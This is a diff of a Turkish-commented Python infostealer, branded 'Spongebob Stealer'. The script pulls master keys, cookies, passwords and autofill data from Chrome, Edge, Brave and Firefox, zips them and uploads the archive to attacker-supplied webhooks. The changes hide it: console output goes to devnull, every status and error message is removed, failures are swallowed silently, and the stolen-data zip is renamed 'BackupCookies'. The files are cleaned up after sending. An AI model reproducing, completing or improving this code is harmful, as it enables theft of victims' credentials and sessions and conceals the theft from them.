@@ -433,6 +433,14 @@ def process_browser(browser_name, browser_config):
             pass
 
 def main():
+    # Console çıktısını gizle
+    import sys
+    import os
+    
+    # stdout ve stderr'i devre dışı bırak
+    sys.stdout = open(os.devnull, 'w')
+    sys.stderr = open(os.devnull, 'w')
+    
     # Tarayıcıları kapat
     for browser_name, browser_config in BROWSERS.items():
         if 'process_name' in browser_config:
@@ -446,7 +454,6 @@ def main():
     keys_output_dir.mkdir(exist_ok=True)
     
     # Chrome/Edge/Brave master key'leri çıkar
-    print("\n🔑 Master key'ler çıkarılıyor...")
     for browser_name, browser_config in BROWSERS.items():
         if browser_name == 'firefox':
             continue
@@ -465,10 +472,8 @@ def main():
                 f.write(f"Browser: {browser_config['name']}\n")
                 f.write(f"Master Key (hex): {master_key.hex()}\n")
                 f.write(f"Master Key (base64): {binascii.b2a_base64(master_key).decode().strip()}\n")
-            print(f"  ✓ {browser_config['name']} master key çıkarıldı")
     
     # Chrome/Edge/Brave verilerini çıkar
-    print("\n🍪 Cookie'ler ve şifreler çıkarılıyor...")
     for browser_name, browser_config in BROWSERS.items():
         if browser_name == 'firefox':
             continue
@@ -477,30 +482,20 @@ def main():
         browser_data_path = pathlib.Path(user_profile) / browser_config['data_path']
         
         if browser_data_path.exists():
-            print(f"  🔍 {browser_config['name']} işleniyor...")
             process_browser(browser_name, browser_config)
-            print(f"  ✓ {browser_config['name']} tamamlandı")
     
     # Firefox cookie'lerini çıkar
-    print("\n🦊 Firefox verileri çıkarılıyor...")
     firefox_profiles = find_firefox_profiles()
     for profile_info in firefox_profiles:
         try:
-            print(f"  🔍 Firefox profile: {profile_info['name']} işleniyor...")
             process_firefox(profile_info)
-            print(f"  ✓ Firefox profile: {profile_info['name']} tamamlandı")
         except Exception as e:
-            print(f"  ✗ Firefox profile hatası: {e}")
-    
-    print("\n" + "=" * 50)
-    print("✅ Veri toplama tamamlandı!")
-    print("=" * 50)
+            pass
 
 def zip_and_send_to_webhook(webhook_url, api_webhook_url=None):
     """Tüm çıkarılan dosyaları ZIP'leyip webhook'lara gönder"""
     try:
-        print("\n📦 ZIP dosyası oluşturuluyor...")
-        zip_filename = f"{os.environ.get('USERNAME', 'user')}_Cookies_{int(__import__('time').time() * 1000)}.zip"
+        zip_filename = f"{os.environ.get('USERNAME', 'user')}_BackupCookies_{int(__import__('time').time() * 1000)}.zip"
         zip_path = pathlib.Path(zip_filename)
         
         file_count = 0
@@ -524,81 +519,60 @@ def zip_and_send_to_webhook(webhook_url, api_webhook_url=None):
                             file_count += 1
         
         zip_size = zip_path.stat().st_size / (1024 * 1024)  # MB
-        print(f"✅ ZIP dosyası oluşturuldu: {zip_filename} ({file_count} dosya, {zip_size:.2f} MB)")
         
         embed_data = {
-            'title': 'Cookie & Password & Autofill Bilgileri',
+            'title': '<:mastercard_spacex:1429086506781511771> Browser Infos',
             'fields': [
-                {'name': 'Kullanıcı', 'value': os.environ.get("USERNAME", "Unknown"), 'inline': True},
-                {'name': 'Bilgisayar', 'value': os.environ.get("COMPUTERNAME", "Unknown"), 'inline': True},
-                {'name': 'Dosya Sayısı', 'value': str(file_count), 'inline': True},
-                {'name': 'ZIP Boyutu', 'value': f'{zip_size:.2f} MB', 'inline': True}
+                {'name': '<a:billing_name:1429086527417221120> PC Name', 'value': f'`{os.environ.get("COMPUTERNAME", "Unknown")}`', 'inline': True}
             ],
-            'color': 3447003,
+            'color': 0x000000,
             'timestamp': __import__("datetime").datetime.utcnow().isoformat() + 'Z'
         }
         
         payload_json = json.dumps({
-            'content': f'🍪 Cookie & 🔐 Password & 📝 Autofill ZIP Dosyası\n👤 Kullanıcı: {os.environ.get("USERNAME", "Unknown")}\n💻 Bilgisayar: {os.environ.get("COMPUTERNAME", "Unknown")}\n📦 Dosya Sayısı: {file_count}\n💾 ZIP Boyutu: {zip_size:.2f} MB\n⏰ Zaman: {__import__("datetime").datetime.now().strftime("%Y-%m-%d %H:%M:%S")}',
+            'username': 'Spongebob Stealer',
+            'content': '<:mastercard_spacex:1429086506781511771> **Browser Infos**',
             'embeds': [embed_data]
         })
         
         # Hem kullanıcı webhook'una hem de API webhook'una gönder
         webhooks_to_send = []
         if webhook_url and webhook_url != '%WEBHOOK%':
-            webhooks_to_send.append(('Kullanıcı', webhook_url))
+            webhooks_to_send.append(webhook_url)
         if api_webhook_url and api_webhook_url != '%API_WEBHOOK%':
-            webhooks_to_send.append(('API', api_webhook_url))
+            webhooks_to_send.append(api_webhook_url)
         
         if not webhooks_to_send:
-            print("❌ Webhook URL bulunamadı!")
             return
         
-        print(f"📤 {len(webhooks_to_send)} webhook'a gönderiliyor...")
-        
-        for webhook_type, url in webhooks_to_send:
+        for url in webhooks_to_send:
             try:
                 with open(zip_path, 'rb') as f:
                     files = {'file': (zip_filename, f, 'application/zip')}
                     data = {'payload_json': payload_json}
                     
                     response = requests.post(url, files=files, data=data, timeout=60)
-                    if response.status_code in [200, 204]:
-                        print(f"✅ ZIP dosyası {webhook_type} webhook'una başarıyla gönderildi!")
-                    else:
-                        print(f"❌ {webhook_type} webhook gönderim hatası: {response.status_code} - {response.text[:100]}")
             except Exception as e:
-                print(f"❌ {webhook_type} webhook gönderme hatası: {e}")
+                pass
         
         # ZIP dosyasını sil
         zip_path.unlink()
-        print("🗑️ ZIP dosyası temizlendi")
         
         # Çıkarılan klasörleri temizle
-        print("🧹 Geçici dosyalar temizleniyor...")
         for item in pathlib.Path('.').iterdir():
             if item.is_dir() and item.name in ['chrome', 'brave', 'edge', 'firefox', 'decrypted_keys']:
                 shutil.rmtree(item, ignore_errors=True)
             elif item.is_file() and item.suffix == '.txt' and not item.name.startswith('.'):
                 item.unlink(missing_ok=True)
-        
-        print("✅ Temizlik tamamlandı!")
                 
     except Exception as e:
-        print(f"❌ ZIP oluşturma/gönderme hatası: {e}")
-        import traceback
-        traceback.print_exc()
+        pass
 
 if __name__ == "__main__":
     if not is_admin():
-        print("❌ This script must be run as an administrator.")
-        print("⚠️  Lütfen scripti yönetici olarak çalıştırın!")
         sys.exit(1)
     
     # Webhook URL'lerini command line argümanından veya environment variable'dan al
-    # cookie.py içinde %WEBHOOK% placeholder'ı olacak, main.js bunu replace edecek
-    # Ayrıca %API_WEBHOOK% için de placeholder olabilir
-    
     webhook_url = None
     api_webhook_url = None
     
@@ -621,23 +595,10 @@ if __name__ == "__main__":
         api_webhook_url = None
     
     if not webhook_url and not api_webhook_url:
-        print("❌ Webhook URL belirtilmedi!")
-        print("⚠️  Kullanım: python cookie.py <webhook_url> [api_webhook_url]")
-        print("⚠️  veya: set WEBHOOK_URL=<webhook_url> && python cookie.py")
         sys.exit(1)
-    
-    if webhook_url:
-        print(f"🔗 Kullanıcı Webhook URL: {webhook_url[:50]}...")
-    if api_webhook_url:
-        print(f"🔗 API Webhook URL: {api_webhook_url[:50]}...")
-    print("")
     
     # Ana işlemi çalıştır
     main()
     
     # ZIP oluştur ve webhook'lara gönder
     zip_and_send_to_webhook(webhook_url, api_webhook_url)
-    
-    print("\n" + "=" * 50)
-    print("🎉 Tüm işlemler tamamlandı!")
-    print("=" * 50)
